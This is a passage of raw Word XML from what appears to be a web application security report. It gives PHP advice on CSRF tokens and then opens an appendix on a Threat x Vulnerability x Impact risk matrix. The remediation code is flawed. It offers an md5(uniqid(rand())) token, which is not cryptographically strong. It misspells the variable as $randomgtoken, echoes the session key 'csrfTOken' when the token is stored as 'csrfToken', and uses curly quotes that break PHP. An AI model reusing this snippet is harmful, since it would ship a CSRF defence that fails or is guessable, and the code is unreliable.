          <w:p w:rsidR="00537422" w:rsidRPr="00537422" w:rsidRDefault="00537422" w:rsidP="00537422">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00537422">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>So, if you are thinking to implement this by your own, try to randomize it.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00537422" w:rsidRPr="00537422" w:rsidRDefault="00537422" w:rsidP="00537422">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00537422">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>You can use:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00537422" w:rsidRPr="00537422" w:rsidRDefault="00537422" w:rsidP="00537422">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00537422">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:i/>
                <w:iCs/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>$randomtoken = md5(uniqid(rand(), true));</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00537422" w:rsidRPr="00537422" w:rsidRDefault="00537422" w:rsidP="00537422">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00537422">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>or try this</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00537422" w:rsidRPr="00537422" w:rsidRDefault="00537422" w:rsidP="00537422">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00537422">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:i/>
                <w:iCs/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>$randomtoken = base64_encode( openssl_random_pseudo_bytes(32));</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00537422" w:rsidRPr="00537422" w:rsidRDefault="00537422" w:rsidP="00537422">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00537422">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>by using base64_encode, it ensures that the generated value will not break your HTML layout with html chars.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00537422" w:rsidRPr="00537422" w:rsidRDefault="00537422" w:rsidP="00537422">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00537422">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Generate this </w:t>
            </w:r>
            <w:r w:rsidRPr="00537422">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:i/>
                <w:iCs/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>$randomgtoken</w:t>
            </w:r>
            <w:r w:rsidRPr="00537422">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>, once the session is initiated after login. And add this to your session variables.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00537422" w:rsidRPr="00537422" w:rsidRDefault="00537422" w:rsidP="00537422">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00537422">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:i/>
                <w:iCs/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>$_SESSION[‘csrfToken’]=$randomtoken.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00537422" w:rsidRPr="00537422" w:rsidRDefault="00537422" w:rsidP="00537422">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00537422">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Add this to every form for users.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00537422" w:rsidRPr="00537422" w:rsidRDefault="00537422" w:rsidP="00537422">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00537422">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:i/>
                <w:iCs/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>&lt;input type=’hidden’ name=’csrfToken’ value='&lt;?php echo($_SESSION[‘csrfTOken’]) ?&gt;’ /&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00537422" w:rsidRPr="00537422" w:rsidRDefault="00537422" w:rsidP="00537422">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00537422">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>The csrfToken is unique to each session. In every new session, it will generated again and then varified with form requests.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00537422" w:rsidRPr="00537422" w:rsidRDefault="00537422" w:rsidP="00537422">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00537422">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>You can either use a single CSRF token for all forms in single session. But using different for all forms may be more secure. But using this method for generating a different csrfToken for different forms can create trouble when users open multiple forms in multiple tabs and submit one by one.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00537422" w:rsidRPr="00537422" w:rsidRDefault="00537422" w:rsidP="00537422">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00537422" w:rsidRDefault="00A81704" w:rsidP="00537422">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="0062005A">
      <w:pPr>
        <w:ind w:right="-59"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Cambria"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:sectPr w:rsidR="00A81704" w:rsidRPr="00802CE3">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="739" w:right="360" w:bottom="0" w:left="360" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="240" w:charSpace="-2049"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00A81704" w:rsidRDefault="00A81704" w:rsidP="00D904AA">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="300"/>
        </w:tabs>
        <w:ind w:right="1420"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00A81704" w:rsidRDefault="00A81704" w:rsidP="00802CE3">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="300"/>
        </w:tabs>
        <w:ind w:left="720" w:right="1420"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="006C7366" w:rsidRPr="00802CE3" w:rsidRDefault="000122C4" w:rsidP="00802CE3">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="300"/>
        </w:tabs>
        <w:ind w:left="720" w:right="1420"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251655680" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="79BB3AD5" wp14:editId="1ECD04C7">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="page">
              <wp:posOffset>6361430</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="page">
              <wp:posOffset>457200</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="13970" cy="179070"/>
            <wp:effectExtent l="0" t="0" r="508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70" cy="179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6" w:name="page24"/>
      <w:bookmarkEnd w:id="6"/>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251657728" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="3A3D0276" wp14:editId="51943D3C">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="page">
              <wp:posOffset>6361430</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="page">
              <wp:posOffset>457200</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="13970" cy="179070"/>
            <wp:effectExtent l="0" t="0" r="508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70" cy="179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7" w:name="page25"/>
      <w:bookmarkEnd w:id="7"/>
      <w:r w:rsidR="006C7366" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Appendix A. Application Risk Score Matrix</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006C7366" w:rsidRPr="00802CE3" w:rsidRDefault="006C7366" w:rsidP="006C7366">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="720"/>
          <w:tab w:val="left" w:pos="6510"/>
        </w:tabs>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="006C7366" w:rsidRPr="00802CE3" w:rsidRDefault="006C7366" w:rsidP="006C7366">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="720"/>
          <w:tab w:val="left" w:pos="6510"/>
        </w:tabs>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="006C7366" w:rsidP="006C7366">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="720"/>
          <w:tab w:val="left" w:pos="6510"/>
        </w:tabs>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="006C7366">
      <w:pPr>
        <w:spacing w:line="394" w:lineRule="auto"/>
        <w:ind w:left="720" w:right="1960"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Our Risk rating is based on this calculation:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="006C7366">
      <w:pPr>
        <w:spacing w:line="337" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="006C7366">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Risk=Threat * Vulnerability * Impact</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="006C7366">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="006C7366">
      <w:pPr>
        <w:spacing w:line="353" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblInd w:w="610" w:type="dxa"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="140"/>
        <w:gridCol w:w="300"/>
        <w:gridCol w:w="260"/>
        <w:gridCol w:w="320"/>
        <w:gridCol w:w="1040"/>
        <w:gridCol w:w="340"/>
        <w:gridCol w:w="420"/>
        <w:gridCol w:w="20"/>
        <w:gridCol w:w="520"/>
        <w:gridCol w:w="400"/>
        <w:gridCol w:w="360"/>
        <w:gridCol w:w="440"/>
        <w:gridCol w:w="120"/>
        <w:gridCol w:w="340"/>
        <w:gridCol w:w="460"/>
        <w:gridCol w:w="100"/>
        <w:gridCol w:w="340"/>
        <w:gridCol w:w="20"/>
        <w:gridCol w:w="460"/>
        <w:gridCol w:w="580"/>
        <w:gridCol w:w="460"/>
        <w:gridCol w:w="440"/>
        <w:gridCol w:w="460"/>
        <w:gridCol w:w="100"/>
        <w:gridCol w:w="360"/>
        <w:gridCol w:w="460"/>
        <w:gridCol w:w="30"/>
      </w:tblGrid>
      <w:tr w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidTr="006C7366">
        <w:trPr>
          <w:trHeight w:val="321"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="140" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1920" w:type="dxa"/>
            <w:gridSpan w:val="4"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="CCFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Threat</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="760" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="CCFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="80"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="20" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="CCFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="520" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="CCFFCC"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="CCFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="400" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="CCFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="920" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="CCFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="80"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="CCFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="CCFFCC"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="CCFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="100" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="CCFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="820" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="CCFFCC"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="CCFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="580" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="CCFFCC"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="CCFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="CCFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1000" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="CCFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="80"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="360" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="CCFFCC"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="CCFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="CCFFCC"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="30" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidTr="006C7366">
        <w:trPr>
          <w:trHeight w:val="514"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="140" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
